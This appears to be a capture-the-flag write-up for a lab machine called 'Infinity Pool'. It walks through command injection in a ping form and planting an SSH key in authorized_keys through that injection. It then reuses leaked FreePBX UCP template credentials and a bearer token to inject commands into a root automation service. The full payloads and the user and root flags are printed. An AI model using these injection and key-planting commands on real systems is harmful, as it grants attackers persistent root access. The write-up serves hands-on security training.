<img width="1910" height="564" alt="image" src="https://github.com/user-attachments/assets/bdbd6282-e230-4f8f-9bd8-08eb88ea8bbd" /># Title: Infinity Pool

#### Category: Boot2Root
#### Difficulty: Medium

#### Description: 

No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.

---

## Task 1: Hacker Holidays Storyline: Act 3 - Reckoning

<img width="925" height="748" alt="image" src="https://github.com/user-attachments/assets/5e658250-1647-4756-bb97-8655fb740162" />

<img width="925" height="582" alt="image" src="https://github.com/user-attachments/assets/bb0deb48-e543-4d32-adac-4f6a58ff973a" />

#### Analysis: 
(I don't know if this is right, just correct it)
There's an attack and there's pattern? 
It's about the patch and the slides that proves of the attack? 
An attacker infiltrated through the patch? 

---

## Task 2: Hacker Holidays: Day 11

<img width="473" height="633" alt="image" src="https://github.com/user-attachments/assets/4d50e7db-8b30-4632-bcb2-1ddfa740123c" />

#### Analysis

---

### Methodology

This is a CVE 
> CVE-2026-46376
Title: FreePBX: Unauthenticated Use of Hard-Coded Credentials Vulnerability in FreePBX UCP Interface
(But how did we know that this is this CVE, at the first place?)


Access the website
```LAB_IP```

<img width="1906" height="802" alt="image" src="https://github.com/user-attachments/assets/3bfebc49-2cdd-4dcf-b062-df091582e22c" />
We don't have a permission to type in textbox because it says the reservations open soon, let's find our way around to try accessing it. 


Inspect the website 

<img width="1694" height="774" alt="image" src="https://github.com/user-attachments/assets/180c3bc7-e1f7-40bb-8c97-2af74c4daebd" />
We can see app.js file under the static folder, let's try to access it 


Access the app.js 
<img width="1916" height="773" alt="image" src="https://github.com/user-attachments/assets/15dad7a0-5a9b-4b28-b31f-4bf3db2ef22e" />
This gives us a lot of information about the structure of the website 
/status
/internal/netcheck
robots.txt 

Let's focus and access the /status because it says staff connectivity pool is in there. 

Access the /status folder 
```<TARGET_IP>/status```

<img width="1910" height="564" alt="image" src="https://github.com/user-attachments/assets/6ace74a6-b9db-4180-b52e-9289685a10a3" />


Confirm a remote property responds before routing a guest transfer.

It means that this website is for remote ping 
Let's try this out, by pinging ourselves 

```
127.0.0.1
```

<img width="961" height="433" alt="image" src="https://github.com/user-attachments/assets/cf6eca88-48fa-4aa3-a7aa-44b5319408dd" />
This successfully ping ourselves then let's try 


```
127.0.0.1;id;#
```

<img width="913" height="438" alt="image" src="https://github.com/user-attachments/assets/8466b061-6f2d-4f4e-bae9-54c45c46514a" />
This results means that we can make the website run commands, but we're running as the web user, not as admin/root.




-----

Let's try to look into its directory
```127.0.0.1;ls```

<img width="915" height="534" alt="image" src="https://github.com/user-attachments/assets/590fd64a-ab0a-4e44-bbe7-0f0c2d76a4cb" />

We got response this means it is accessible, maybe we could access the user flag from here 
127.0.0.1;ls/home/web/

 We now know the location of the 
 > user.txt 


----



We will do some ssh to access it and find the root 
Generate temporary SSH key

Paste to terminal
```ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""```
<img width="666" height="464" alt="image" src="https://github.com/user-attachments/assets/d0c26366-a745-4855-8e44-b2b433fc40a4" />


```cat ctf_key.pub```
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSFYMxyUygiokJssjavQ3Ucd2PfuPY7EuqOLs01oXl8j+4REcM6nuL/6fwIUcpKQGzagfqzESqmTpF0ozATBZemwwxb0fAQaa56QxEmciWDkTTCZQewKmucyTmVsUZHoirEOOeB5BWnm19Fwt6zZSz/a7NTz83nB0cJtdaDl7EKn/7pU3ni7VvPn6AX12QFGJFjfNhxh4IM7x2Ylwgbeb5rjG4bJaKK3NmxiyoEfRn53WIQ61bCudNxdCpQV38GBlDnd7HI8iNXox6iQdSvtRz65MlTSBSLSKJ5fZZzb0Qfs7JR28qTa95ND5QUCnsXlR9H+bDnmzDLuGcxP/q3h9 chrztndclz@chrztndclz

```
This is now our key


Encrypt it in base64
```base64 -w0 ctf_key.pub```
```
c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFESFNGWU14eVV5Z2lva0pzc2phdlEzVWNkMlBmdVBZN0V1cU9MczAxb1hsOGorNFJFY002bnVMLzZmd0lVY3BLUUd6YWdmcXpFU3FtVHBGMG96QVRCWmVtd3d4YjBmQVFhYTU2UXhFbWNpV0RrVFRDWlFld0ttdWN5VG1Wc1VaSG9pckVPT2VCNUJXbm0xOUZ3dDZ6WlN6L2E3TlR6ODNuQjBjSnRkYURsN0VLbi83cFUzbmk3VnZQbjZBWDEyUUZHSkZqZk5oeGg0SU03eDJZbHdnYmViNXJqRzRiSmFLSzNObXhpeW9FZlJuNTNXSVE2MWJDdWROeGRDcFFWMzhHQmxEbmQ3SEk4aU5Yb3g2aVFkU3Z0Uno2NU1sVFNCU0xTS0o1ZlpaemIwUWZzN0pSMjhxVGE5NU5ENVFVQ25zWGxSOUgrYkRubXpETHVHY3hQL3EzaDkgY2hyenRuZGNsekBjaHJ6dG5kY2x6Cg==
```
<img width="652" height="178" alt="image" src="https://github.com/user-attachments/assets/b99120f6-68a3-4d48-a14d-33dd3c4a27b5" />



Paste the result of this to the command below

Template:
```
host=127.0.0.1;mkdir -p /home/web/.ssh;echo <paste_base64_key>|base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#
```
```
host=127.0.0.1;mkdir -p /home/web/.ssh;echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFESFNGWU14eVV5Z2lva0pzc2phdlEzVWNkMlBmdVBZN0V1cU9MczAxb1hsOGorNFJFY002bnVMLzZmd0lVY3BLUUd6YWdmcXpFU3FtVHBGMG96QVRCWmVtd3d4YjBmQVFhYTU2UXhFbWNpV0RrVFRDWlFld0ttdWN5VG1Wc1VaSG9pckVPT2VCNUJXbm0xOUZ3dDZ6WlN6L2E3TlR6ODNuQjBjSnRkYURsN0VLbi83cFUzbmk3VnZQbjZBWDEyUUZHSkZqZk5oeGg0SU03eDJZbHdnYmViNXJqRzRiSmFLSzNObXhpeW9FZlJuNTNXSVE2MWJDdWROeGRDcFFWMzhHQmxEbmQ3SEk4aU5Yb3g2aVFkU3Z0Uno2NU1sVFNCU0xTS0o1ZlpaemIwUWZzN0pSMjhxVGE5NU5ENVFVQ25zWGxSOUgrYkRubXpETHVHY3hQL3EzaDkgY2hyenRuZGNsekBjaHJ6dG5kY2x6Cg==|base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#
```

Go to website and and paste the command above. 

<img width="947" height="366" alt="image" src="https://github.com/user-attachments/assets/f793b650-4a80-423c-a3a3-f30c5503ce8b" />



We can now do SSH for the website
```ssh -o IdentitiesOnly=yes -i ctf_key web@<VICTIM_IP>```

<img width="658" height="632" alt="image" src="https://github.com/user-attachments/assets/6c6d8a55-11e9-4c5e-ac7c-678129175b64" />
We are now in SSH, let's try to find our way around and explore

```
id
ls
cat user.txt
```

<img width="457" height="172" alt="image" src="https://github.com/user-attachments/assets/46f387c4-57cd-413e-bf0f-70284b9a7df6" />

We now have the user flag


We need to find the authentication token first to have privilege escalation 



Use this command to shows a detailed list of processes currently running on a Linux machine.
```ps auxww```

<img width="1700" height="57" alt="image" src="https://github.com/user-attachments/assets/9ae46b2c-ae6f-4d2a-a767-1752c2520a98" />


The highlighted caught my eye because it's in our directory

Yet if we try to naviagte it we don't have permission to it. Let's find other way. 


Thought Process: 
We used ps auxww to identify a root-owned Watchtower process running from the automation directory. Since our web user couldn't access that directory directly, we looked for another way to investigate it. We checked the systemd configuration because it manages background services and can reveal how the Watchtower process is configured and started. 


```ls -la /etc/systemd/system/```

<img width="566" height="169" alt="image" src="https://github.com/user-attachments/assets/c62a8482-d561-44f4-8ed8-90f8d835547e" />

And base in the permission it's readable so let's try to see it 


```
cat /etc/systemd/system/cc-watchtower.service
```

```
web@tryhackme-2404:/var/www/infinitycat /etc/systemd/system/cc-watchtower.service
[Unit]
Description=Closed Circuit - Watchtower ops console (loopback)
After=network.target

[Service]
User=svc-watch
Group=svc-watch
WorkingDirectory=/var/www/infinity_pool/watchtower
ExecStart=/var/www/infinity_pool/watchtower/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:3000 wsgi:app
Restart=on-failure
RestartSec=2

[Install]
WantedBy=multi-user.target


```

This service file tells us exactly how the Watchtower application is running. The most important part is that the application runs as the svc-watch user, not as root. It also confirms that the application lives in /var/www/infinity_pool/watchtower. The ExecStart line shows that Gunicorn starts the Python application and listens only on 127.0.0.1:3000, meaning it is accessible only from the server itself. So the main takeaway is: we found an internal Watchtower web application running as svc-watch, with its configuration and startup details managed by systemd.







##Query the root Watchtower service
Command:
```curl -sS http://127.0.0.1:3000/```

```
web@tryhackme-2404:/var/www/infinity_pool$ curl -i http://127.0.0.1:3000/
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 08 Aug 2026 06:37:44 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 1294

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Watchtower &mdash; ops console</title>
<style>
  body{margin:0;background:#0a0b0e;color:#e7e9ee;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
  header{padding:16px 24px;border-bottom:1px solid #262a31;letter-spacing:.2em}
  main{max-width:760px;margin:0 auto;padding:40px 24px}
  .tiles{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:20px}
  .tile{background:#15171c;border:1px solid #262a31;border-radius:10px;padding:18px}
  .tile b{display:block;font-size:1.6rem}
  .muted{color:#8b909b}
  code{color:#c9a24b}
</style>
</head>
<body>
<header>WATCHTOWER &middot; <span class="muted">internal</span></header>
<main>
  <h1>Surveillance operations</h1>
  <p class="muted">Loopback-only console. Authenticated by network position.</p>
  <div class="tiles">
    <div class="tile"><b>1184</b><span class="muted">active feeds</span></div>
    <div class="tile"><b>OK</b><span class="muted">datastore link</span></div>
    <div class="tile"><b>root</b><span class="muted">automation worker</span></div>
  </div>
  <p class="muted" style="margin-top:28px">
    Service endpoints: <code>/api/health</code> &middot; <code>/api/config</code>
  </p>
</main>
</body>
</html>w
```


Thi gives us service endpoints:
Think of an endpoint as a specific URL that provides a particular piece of information.

```
  /api/health
  /api/config
```


Let's just look at /api/config is potentially more valuable because configuration tells us how the application is set up. It could reveal things like service names, database details, file paths, ports, or other settings.


Command:
```
web@tryhackme-2404:/var/www/infinity_pool$ curl -i http://127.0.0.1:3000/api/config
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 08 Aug 2026 06:48:28 GMT
Connection: close
Content-Type: application/json
Content-Length: 312

{"automation_endpoint":"http://127.0.0.1:9000","note":"internal network only -- do not expose","ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.","telephony_pass":"St4yN0t1c3d_2026","telephony_portal":"http://127.0.0.1:8080/ucp","telephony_user":"FreePBXUCPTemplateCreator"}

```
This tells us that the Watchtower configuration exposed internal services and credentials. We discovered that the automation service runs on 127.0.0.1:9000, and another telephony/UCP service runs on 127.0.0.1:8080/ucp. Most importantly, it exposed a username and password for the UCP service.

Another way another upon searching this seems like under CVE-2026-46376, 

FreePBX is an open source IP PBX. From 15.0.42 to before 16.0.45 and 17.0.7, unauthenticated users may be able to access the User Control Panel (UCP) using hard-coded initial template credentials if these were not immediately changed by the Administrator who enabled UCP.


Let's check if this its in the affected versions


```
web@tryhackme-2404:/var/www/infinity_pool$ grep -i version /var/www/html/admin/modules/ucp/module.xml
	<version>16.0.39</version>
		<version>16.0</version>
		<version>16.0.37</version>
```

This means this version is still subjected to the known vulnerability which we can exploit. 



Let's try to access it: 
This command is using SSH port forwarding to let your machine access a service that is only available on the CTF target's 127.0.0.1.


Since we now know that this is are vulnerable to freepbx 
Let's exploit it

Open another terminal and keep it open: 

Port Forwarding 
```
ssh -o IdentitiesOnly=yes -i ctf_key \
  -L 8080:127.0.0.1:8080 \
  web@10.48.166.151
```
<img width="957" height="578" alt="image" src="https://github.com/user-attachments/assets/cf3747c2-1c99-4cae-aa51-402b673ee953" />


Open browser and navigate link:
```
http://127.0.0.1:8080/ucp/  
```

Login using the credentials gathered in api/config
```
"telephony_pass":"St4yN0t1c3d_2026"
"telephony_portal":"http://127.0.0.1:8080/ucp"
"telephony_user":"FreePBXUCPTemplateCreator"
```

<img width="1907" height="766" alt="image" src="https://github.com/user-attachments/assets/7a337d47-e27d-4454-a7f9-33c72601dcdf" />


<img width="388" height="473" alt="image" src="https://github.com/user-attachments/assets/15860ded-afcc-48ab-8ab7-3812c852f9f4" />


Explore the website, upon explore I say the key  in the Voicemail widget if you add it

<img width="1118" height="757" alt="image" src="https://github.com/user-attachments/assets/a48b173f-9081-4ea9-bb91-38d68010a5a2" />

> "Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>

We can use this to have permission to earlier files





Paste this in the same terminal where you got to access the http://127.0.0.1:8080/ucp/

Note: This is just the same base64 key used in the first SSH 

```
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"x;mkdir -p /root/.ssh;echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFESFNGWU14eVV5Z2lva0pzc2phdlEzVWNkMlBmdVBZN0V1cU9MczAxb1hsOGorNFJFY002bnVMLzZmd0lVY3BLUUd6YWdmcXpFU3FtVHBGMG96QVRCWmVtd3d4YjBmQVFhYTU2UXhFbWNpV0RrVFRDWlFld0ttdWN5VG1Wc1VaSG9pckVPT2VCNUJXbm0xOUZ3dDZ6WlN6L2E3TlR6ODNuQjBjSnRkYURsN0VLbi83cFUzbmk3VnZQbjZBWDEyUUZHSkZqZk5oeGg0SU03eDJZbHdnYmViNXJqRzRiSmFLSzNObXhpeW9FZlJuNTNXSVE2MWJDdWROeGRDcFFWMzhHQmxEbmQ3SEk4aU5Yb3g2aVFkU3Z0Uno2NU1sVFNCU0xTS0o1ZlpaemIwUWZzN0pSMjhxVGE5NU5ENVFVQ25zWGxSOUgrYkRubXpETHVHY3hQL3EzaDkgY2hyenRuZGNsekBjaHJ6dG5kY2x6Cg==|base64 -d > /root/.ssh/authorized_keys;chmod 700 /root/.ssh;chmod 600 /root/.ssh/authorized_keys;#"}'
```
<img width="1919" height="186" alt="image" src="https://github.com/user-attachments/assets/ee22f78c-0b70-4cca-afc1-5ce60696b888" />




Open another terminal SSH
```ssh -o IdentitiesOnly=yes -i ctf_key root@10.48.166.151```

<img width="955" height="773" alt="image" src="https://github.com/user-attachments/assets/0a52a9a1-8fa5-4d88-ab02-55fb7b3cc359" />

We now have root privilege, navigate the root.txt

<img width="1614" height="153" alt="image" src="https://github.com/user-attachments/assets/a8428bb4-1c74-4668-b8af-3d35d79e5215" />







---

### Today's Itinerary

1. Find the user flag
> THM{n0_v1s1bl3_3dg3}


2. Find the root flag
> THM{tr4c3d_t0_th3_h0r1z0n}

---

Attack Kill Chain:
1. Access & Inspect the website
2. Go to the accessible for ping website 
3. Find out that we can execute command in the website 
4. Find out where the user flag is located
5. Create an SSH for the web account
6. Access the web account and find the user flag
7. Find a way to escalate privilege
8. we find out about the automation and watchtower
9. automation is deadend because we need key to access it
10. We found out the watch tower service is vulnerable to a CVE
11. We exploit that CVE and got the credentials and access the freepbxucp
12. We found the auth key
13. We create a payload again to SSH to the root account
14. We got access and we navigate the root flag 

---

### Flag
User Flag: 
> THM{n0_v1s1bl3_3dg3}

Root Flag: 
> THM{tr4c3d_t0_th3_h0r1z0n}
